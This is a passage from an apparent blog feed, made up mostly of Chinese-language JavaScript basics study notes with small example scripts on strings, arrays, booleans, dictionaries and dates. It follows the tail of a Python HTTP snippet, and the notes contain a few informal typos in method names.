&lt;&#x2F;span&gt;&lt;span&gt;    response_str = response.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    conn.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;response_str&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>JavaScript</title>
		<published>2020-08-13T00:00:00+00:00</published>
		<updated>2020-08-13T00:00:00+00:00</updated>
		<link href="https://baz.ee/javascript/" type="text/html"/>
		<id>https://baz.ee/javascript/</id>
		<content type="html">&lt;p&gt;JavaScript基础&lt;&#x2F;p&gt;
&lt;p&gt;HTML搭建网页提供内容，实现网页的结构层&lt;&#x2F;p&gt;
&lt;p&gt;CSS修饰网页，实现网页的表现层&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;JS是真正的前端语言，面向对象的，实现网页的行为层&lt;&#x2F;p&gt;
&lt;p&gt;嵌入网页运行，实现网页的动态效果、表单验证、创建cookie、修改HTML等功能&lt;&#x2F;p&gt;
&lt;p&gt;JavaScript组成&lt;&#x2F;p&gt;
&lt;p&gt;ECMAScript+DOM（文档对象类型）+BOM（浏览器对象类型）统称为JavaScript&lt;&#x2F;p&gt;
&lt;p&gt;ECMAScript包括了JS基础&lt;&#x2F;p&gt;
&lt;p&gt;DOM用来描述处理网页的方法和接口&lt;&#x2F;p&gt;
&lt;p&gt;BOM描述了与浏览器进行交互的方法和接口&lt;&#x2F;p&gt;
&lt;p&gt;JS学习内容：&lt;&#x2F;p&gt;
&lt;p&gt;数据类型（变量、数字、字符串、布尔值、数组、字典）&lt;&#x2F;p&gt;
&lt;p&gt;流程控制（条件判断、循环语句）&lt;&#x2F;p&gt;
&lt;p&gt;函数（定义、创建、调用、闭包、高级函数）&lt;&#x2F;p&gt;
&lt;p&gt;面向对象（对象的定义、创建对象、对象的属性和方法）&lt;&#x2F;p&gt;
&lt;p&gt;DOM&lt;&#x2F;p&gt;
&lt;p&gt;BOM&lt;&#x2F;p&gt;
&lt;p&gt;JavaScript使用的位置&lt;&#x2F;p&gt;
&lt;p&gt;脚本可以放在三个位置（head区域、body区域、外部的JS文件）&lt;&#x2F;p&gt;
&lt;p&gt;放在head和body的时候，都需要使用&lt;script&gt;标签包裹JS脚本&lt;&#x2F;p&gt;
&lt;p&gt;如果要引用外部的js脚本，在HTML的head中要使用&lt;script&gt;标签，通过添加src属性来设置外部js脚本的位置。&lt;&#x2F;p&gt;
&lt;script src=&quot;test.js&quot; rel=&quot;srcript&quot;&gt;&lt;&#x2F;script&gt;
&lt;p&gt;JavaScript注释风格&lt;&#x2F;p&gt;
&lt;p&gt;单行注释&#x2F;&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;多行注释&#x2F;* *&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;JavaScript变量&lt;&#x2F;p&gt;
&lt;p&gt;变量可以是任意的数据类型、变量是存储信息的容器，通过变量可以实现复杂编程，通过变量可以实现复杂运算和高级编程&lt;&#x2F;p&gt;
&lt;p&gt;创建变量的语法：&lt;&#x2F;p&gt;
&lt;p&gt;var a;&lt;&#x2F;p&gt;
&lt;p&gt;a=“hello”;&lt;&#x2F;p&gt;
&lt;p&gt;JavaScript的变量需要提前声明，需要使用关键词var来实现。因为js本质属于动态语言，所以声明变量的时候不需要指定数据的类型，声明之后直接赋值即可&lt;&#x2F;p&gt;
&lt;p&gt;var a=1;&lt;&#x2F;p&gt;
&lt;p&gt;var a=1;b=‘hello’;&lt;&#x2F;p&gt;
&lt;p&gt;变量名称的命名规则：&lt;&#x2F;p&gt;
&lt;p&gt;变量的第一个字符必须是字母、下划线、或者美元符号&lt;&#x2F;p&gt;
&lt;p&gt;剩下的字符可以是下划线、美元符号或者任意的字母或者数字&lt;&#x2F;p&gt;
&lt;p&gt;对大小写敏感&lt;&#x2F;p&gt;
&lt;p&gt;不能使用JS的保留字和关键词，不能用函数名或者变量来命名&lt;&#x2F;p&gt;
&lt;p&gt;保留字：class、export、Boolen、abstract……&lt;&#x2F;p&gt;
&lt;p&gt;关键词：for、else、if、switch、try、var……&lt;&#x2F;p&gt;
&lt;p&gt;变量的命名规则：&lt;&#x2F;p&gt;
&lt;p&gt;驼峰标记法&lt;&#x2F;p&gt;
&lt;p&gt;首字母（单词）是小写的，接下来的字母（单词）都是大写开头&lt;&#x2F;p&gt;
&lt;p&gt;var thisisatest；&lt;&#x2F;p&gt;
&lt;p&gt;var thisIsAText；&lt;&#x2F;p&gt;
&lt;p&gt;Pascal标记法&lt;&#x2F;p&gt;
&lt;p&gt;首字母（单词）是大写的，接下来的字母（单词）都是以大写开头&lt;&#x2F;p&gt;
&lt;p&gt;var  ThisIsAText&lt;&#x2F;p&gt;
&lt;p&gt;匈牙利标记法&lt;&#x2F;p&gt;
&lt;p&gt;在Pascal标记法的前面添加一个字符用来说明该变量属于什么类型。i表示整数，s表示字符串&lt;&#x2F;p&gt;
&lt;p&gt;var iThisIsATest=10;&lt;&#x2F;p&gt;
&lt;p&gt;JavaScript常见的数据类型（基本数据类型）分类：&lt;&#x2F;p&gt;
&lt;p&gt;undefined null Boolean number string&lt;&#x2F;p&gt;
&lt;p&gt;要查看一个变量属于哪一种类型，可以通过typeof（变量）来查看&lt;&#x2F;p&gt;
&lt;p&gt;JavaScript数字&lt;&#x2F;p&gt;
&lt;p&gt;JS的数字对象只有一种数据类型，就是number。不区分整数、浮点数等。支持十进制、八进制、十六进制、科学计数法等，可以实现加减乘除、求余、累积等&lt;&#x2F;p&gt;
&lt;p&gt;因为属于面向对象的编程语言，所以可以给数字设置属性和方法&lt;&#x2F;p&gt;
&lt;p&gt;数字的属性和方法&lt;&#x2F;p&gt;
&lt;p&gt;属性：&lt;&#x2F;p&gt;
&lt;p&gt;NaN：非数字值   isNaN()&lt;&#x2F;p&gt;
&lt;p&gt;max-value&lt;&#x2F;p&gt;
&lt;p&gt;min-value&lt;&#x2F;p&gt;
&lt;p&gt;方法：&lt;&#x2F;p&gt;
&lt;p&gt;tostring&lt;&#x2F;p&gt;
&lt;p&gt;valueof 返回数字对象的数字值&lt;&#x2F;p&gt;
&lt;p&gt;JavaScript字符串&lt;&#x2F;p&gt;
&lt;p&gt;string对象用于处理字符串信息&lt;&#x2F;p&gt;
&lt;p&gt;赋值的时候需要添加引号，也可以设置属性和方法，可以实现字符串相加、查询、相加、匹配、替代等操作&lt;&#x2F;p&gt;
&lt;p&gt;字符串属性：&lt;&#x2F;p&gt;
&lt;p&gt;length：字符串长度&lt;&#x2F;p&gt;
&lt;p&gt;方法：&lt;&#x2F;p&gt;
&lt;p&gt;indexof()&lt;&#x2F;p&gt;
&lt;p&gt;subtring()&lt;&#x2F;p&gt;
&lt;p&gt;toUppercase()&lt;&#x2F;p&gt;
&lt;p&gt;big()&lt;&#x2F;p&gt;
&lt;p&gt;bold()&lt;&#x2F;p&gt;
&lt;p&gt;concat()   连接字符串&lt;&#x2F;p&gt;
&lt;p&gt;fontcolor()&lt;&#x2F;p&gt;
&lt;p&gt;字符串的索引&lt;&#x2F;p&gt;
&lt;p&gt;charAt()    charcodeat():通过下标检索字符&lt;&#x2F;p&gt;
&lt;p&gt;indexof()    lastindexof(): 通过字符检索下标&lt;&#x2F;p&gt;
&lt;p&gt;字符串截取&lt;&#x2F;p&gt;
&lt;p&gt;slice() substring() substr()&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getMail(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		var mail=prompt(&amp;#39;请输入邮箱：&amp;#39;);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		var pos=mail.indexOf(&amp;#39;@&amp;#39;);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		var name=mail.slice(0,pos);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		var address=mail.substr(pos+1);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	document.write(&amp;#39;你输入的邮箱用户名是：&amp;#39;+name+&amp;#39;&amp;lt;br&amp;gt;&amp;#39;);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	document.write(&amp;#39;你输入的邮箱域名是：&amp;#39;+address+&amp;#39;&amp;lt;br&amp;gt;&amp;#39;);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	}&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	getMail(); &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;字符串的分割替换&lt;&#x2F;p&gt;
&lt;p&gt;split()  将字符串转换成数组    var a=[1,2,3]&lt;&#x2F;p&gt;
&lt;p&gt;replease()&lt;&#x2F;p&gt;
&lt;p&gt;字符串的大小写转换&lt;&#x2F;p&gt;
&lt;p&gt;toUperCase()&lt;&#x2F;p&gt;
&lt;p&gt;toLowerCase()&lt;&#x2F;p&gt;
&lt;p&gt;JavaScript布尔值&lt;&#x2F;p&gt;
&lt;p&gt;布尔对象的作用就是将非逻辑值转换成逻辑值（true或者false）&lt;&#x2F;p&gt;
&lt;p&gt;创建布尔对象的语法：&lt;&#x2F;p&gt;
&lt;p&gt;new Boolean( value)&lt;&#x2F;p&gt;
&lt;p&gt;Boolean(value)&lt;&#x2F;p&gt;
&lt;p&gt;创建值为false的Boolean对象：&lt;&#x2F;p&gt;
&lt;p&gt;var a=new Boolean();&lt;&#x2F;p&gt;
&lt;p&gt;var a=new Boolean(0);&lt;&#x2F;p&gt;
&lt;p&gt;var a=new Boolean(“”)&lt;&#x2F;p&gt;
&lt;p&gt;var a=new Boolean(false)&lt;&#x2F;p&gt;
&lt;p&gt;var a=new Boolean(NaN)&lt;&#x2F;p&gt;
&lt;p&gt;var a=new Boolean(null);&lt;&#x2F;p&gt;
&lt;p&gt;创建值为true的Boolean对象:&lt;&#x2F;p&gt;
&lt;p&gt;var a=new Boolean(1);&lt;&#x2F;p&gt;
&lt;p&gt;var a=new Boolean(true);&lt;&#x2F;p&gt;
&lt;p&gt;var a=new Boolean(‘false’);&lt;&#x2F;p&gt;
&lt;p&gt;布尔运算&lt;&#x2F;p&gt;
&lt;p&gt;判断 &amp;gt;&amp;lt;=&lt;&#x2F;p&gt;
&lt;p&gt;计算 &amp;amp;&amp;amp;||！&lt;&#x2F;p&gt;
&lt;p&gt;JavaScript数组&lt;&#x2F;p&gt;
&lt;p&gt;数组也是用来存储信息的容器，包括数字、字符串、数组、布尔值。&lt;&#x2F;p&gt;
&lt;p&gt;数组也可以设置属性和方法，可以实现数组的索引、相加、截取等操作&lt;&#x2F;p&gt;
&lt;p&gt;创建数组&lt;&#x2F;p&gt;
&lt;p&gt;第一种方法：&lt;&#x2F;p&gt;
&lt;p&gt;var a=new Array();&lt;&#x2F;p&gt;
&lt;p&gt;a[0]=1;&lt;&#x2F;p&gt;
&lt;p&gt;a[1]=‘hello’;&lt;&#x2F;p&gt;
&lt;p&gt;a[2]=[1,2,3]&lt;&#x2F;p&gt;
&lt;p&gt;第二种方法：&lt;&#x2F;p&gt;
&lt;p&gt;var b=new Array(1,’hello’,[1,2,3])&lt;&#x2F;p&gt;
&lt;p&gt;第三种方式：&lt;&#x2F;p&gt;
&lt;p&gt;var c=[1,’hello’,[1,2,3]]&lt;&#x2F;p&gt;
&lt;p&gt;访问数组：&lt;&#x2F;p&gt;
&lt;p&gt;var x=a[1]&lt;&#x2F;p&gt;
&lt;p&gt;数组索引：var x=a[1]&lt;&#x2F;p&gt;
&lt;p&gt;数字长度：var x=a.lenth&lt;&#x2F;p&gt;
&lt;p&gt;数组截取：var x=a.slice(0,2)&lt;&#x2F;p&gt;
&lt;p&gt;数组相连：a.concat(b)&lt;&#x2F;p&gt;
&lt;p&gt;数组搜索：var x=a.indexOf(3)&lt;&#x2F;p&gt;
&lt;p&gt;数组修改a[0]=10&lt;&#x2F;p&gt;
&lt;p&gt;数组的属性和方法&lt;&#x2F;p&gt;
&lt;p&gt;属性&lt;&#x2F;p&gt;
&lt;p&gt;length&lt;&#x2F;p&gt;
&lt;p&gt;方法&lt;&#x2F;p&gt;
&lt;p&gt;concat()&lt;&#x2F;p&gt;
&lt;p&gt;join()  把数组转换成字符串&lt;&#x2F;p&gt;
&lt;p&gt;pop()  弹出数组的最后一个元素，并且显示出来&lt;&#x2F;p&gt;
&lt;p&gt;push()  往数组的末尾添加元素，返回新数组的长度&lt;&#x2F;p&gt;
&lt;p&gt;reverse()  颠倒数组中元素的顺序&lt;&#x2F;p&gt;
&lt;p&gt;shift()  删除数组的第一个元素，并且把删除的元素显示出来&lt;&#x2F;p&gt;
&lt;p&gt;slice()&lt;&#x2F;p&gt;
&lt;p&gt;sort()  对数组的元素进行排序&lt;&#x2F;p&gt;
&lt;p&gt;数组搜索&lt;&#x2F;p&gt;
&lt;p&gt;indexOf()   lastindexOf()&lt;&#x2F;p&gt;
&lt;p&gt;数组在搜索的时候要完全匹配才可以&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var nums=[3,4,5,6,1,&amp;#39;hi&amp;#39;,3,&amp;#39;hi&amp;#39;,&amp;#39;hi&amp;#39;];&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var pos=nums.indexOf(&amp;#39;hi&amp;#39;,1)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        function ArrayIndexOf(arr,value){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            var a=[];&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            for(var i=0;i&amp;lt;arr.length;i++){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                if (arr[i]===value){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    a.push(i)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            console.log(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var pos2=ArrayIndexOf(nums,1)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;双等号==： &lt;&#x2F;p&gt;
&lt;p&gt;\1.   如果两个值类型相同，再进行三个等号(===)的比较&lt;&#x2F;p&gt;
&lt;p&gt;\2.   如果两个值类型不同，也有可能相等，需根据以下规则进行类型转换在比较：&lt;&#x2F;p&gt;
&lt;p&gt;·    如果一个是null，一个是undefined，那么相等&lt;&#x2F;p&gt;
&lt;p&gt;·    如果一个是字符串，一个是数值，把字符串转换成数值之后再进行比较&lt;&#x2F;p&gt;
&lt;p&gt;三等号===:&lt;&#x2F;p&gt;
&lt;p&gt;\1.   如果类型不同，就一定不相等&lt;&#x2F;p&gt;
&lt;p&gt;\2.   如果两个都是数值，并且是同一个值，那么相等；如果其中至少一个是NaN，那么不相等。（判断一个值是否是NaN，只能使用isNaN( ) 来判断）&lt;&#x2F;p&gt;
&lt;p&gt;\3.   如果两个都是字符串，每个位置的字符都一样，那么相等，否则不相等。&lt;&#x2F;p&gt;
&lt;p&gt;\4.   如果两个值都是true，或是false，那么相等&lt;&#x2F;p&gt;
&lt;p&gt;\5.   如果两个值都引用同一个对象或是函数，那么相等，否则不相等&lt;&#x2F;p&gt;
&lt;p&gt;\6.   如果两个值都是null，或是undefined，那么相等&lt;&#x2F;p&gt;
&lt;p&gt;js里面带“”和不带“”的数字用==的值是一致的，如果是===就不一致，因为类型不一样（带双引号是字符串，不带双引号是数字）&lt;&#x2F;p&gt;
&lt;p&gt;数组增删&lt;&#x2F;p&gt;
&lt;p&gt;push() pop() shift() unshift()&lt;&#x2F;p&gt;
&lt;p&gt;数组的排序&lt;&#x2F;p&gt;
&lt;p&gt;sort()   reverse()   join()&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var nums=[1,2,3]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var nums1=[-10,6,9,2,100,99,-88]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var a=nums.reverse()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var b=nums1.sort(function(a,b){return a-b})&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(b)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; document.write(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; document.write(typeof(a))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; console.log(nums)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;数组截取&lt;&#x2F;p&gt;
&lt;p&gt;slice()&lt;&#x2F;p&gt;
&lt;p&gt;splice()   删除掉元素并返回删掉的内容&lt;&#x2F;p&gt;
&lt;p&gt;var a=nums.splice(2,3)是指删掉2之后的3个元素&lt;&#x2F;p&gt;
&lt;p&gt;var a=nums.splice(2,3,888) 删掉2之后的3个元素并用888替换删掉的元素&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var nums=[1,2,3,4,5,6,7,8]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var nums1=[-10,6,9,2,100,99,-88]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var a=nums.splice(2,3,888,&amp;#39;hello&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(nums)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;concat()&lt;&#x2F;p&gt;
&lt;p&gt;JavaScript字典&lt;&#x2F;p&gt;
&lt;p&gt;字典对象通过映射这个方式实现键值对的数据存储。字典可以访问、修改、判断&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var dict={&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            a:1,b:2,c:3,d:&amp;#39;hello&amp;#39;,&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var x=dict.a;  &#x2F;&#x2F;访问字典&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.write(x)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        dict.d=&amp;#39;hi&amp;#39;  &#x2F;&#x2F;修改字典&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.write(dict.d)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var y=&amp;#39;hello&amp;#39; in dict;  &#x2F;&#x2F;in、not in成员操作符，返回值是布尔值&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.write(y)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;JavaScript日期&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;日期对象用于处理时间和日期&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;语法：&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;var a=new Date();&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;常用的方法：&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;getfullyear()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;getmonth()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;getDate()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;getDay()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;getHours()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;button onclick=&amp;quot;Time()&amp;quot;&amp;gt;点击显示日期&amp;lt;&#x2F;button&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        function Time(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            var a=new Date()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            document.write(a)    &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var a=new Date()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var weeks=[&amp;#39;周日&amp;#39;,&amp;#39;周一&amp;#39;,&amp;#39;周二&amp;#39;,&amp;#39;周三&amp;#39;,&amp;#39;周四&amp;#39;,&amp;#39;周五&amp;#39;,&amp;#39;周六&amp;#39;]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var week=a.getDay()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var year=a.getFullYear()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var month=a.getMonth()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var day=a.getDate()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var hours=a.getHours()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var minutes=a.getMinutes()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var seconds=a.getSeconds()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var time=&amp;#39;当前的时间是&amp;#39;+year+&amp;#39;年&amp;#39;+month+&amp;#39;月&amp;#39;+day+&amp;#39;日&amp;#39;+hours+&amp;#39;时&amp;#39;+minutes+&amp;#39;分&amp;#39;+seconds+&amp;#39;秒,&amp;#39;+weeks[week]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.write(time)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;JavaScript日期&lt;&#x2F;p&gt;
&lt;p&gt;日期对象用于处理时间和日期&lt;&#x2F;p&gt;
&lt;p&gt;语法：&lt;&#x2F;p&gt;
&lt;p&gt;var a=new Date();&lt;&#x2F;p&gt;
&lt;p&gt;常用的方法：&lt;&#x2F;p&gt;
&lt;p&gt;getfullyear()&lt;&#x2F;p&gt;
&lt;p&gt;getmonth()&lt;&#x2F;p&gt;
&lt;p&gt;getDate()&lt;&#x2F;p&gt;
&lt;p&gt;getDay()&lt;&#x2F;p&gt;
&lt;p&gt;getHours()&lt;&#x2F;p&gt;
&lt;p&gt;JavaScript数学&lt;&#x2F;p&gt;
&lt;p&gt;math对象用于实现数学运算，比如取绝对值，四舍五入，正弦，余弦，平方根等数学运算&lt;&#x2F;p&gt;
&lt;p&gt;属性&lt;&#x2F;p&gt;
&lt;p&gt;PI 返回圆周率&lt;&#x2F;p&gt;
&lt;p&gt;sqrt 计算平方根&lt;&#x2F;p&gt;
&lt;p&gt;方法&lt;&#x2F;p&gt;
&lt;p&gt;abs()&lt;&#x2F;p&gt;
&lt;p&gt;sin()&lt;&#x2F;p&gt;
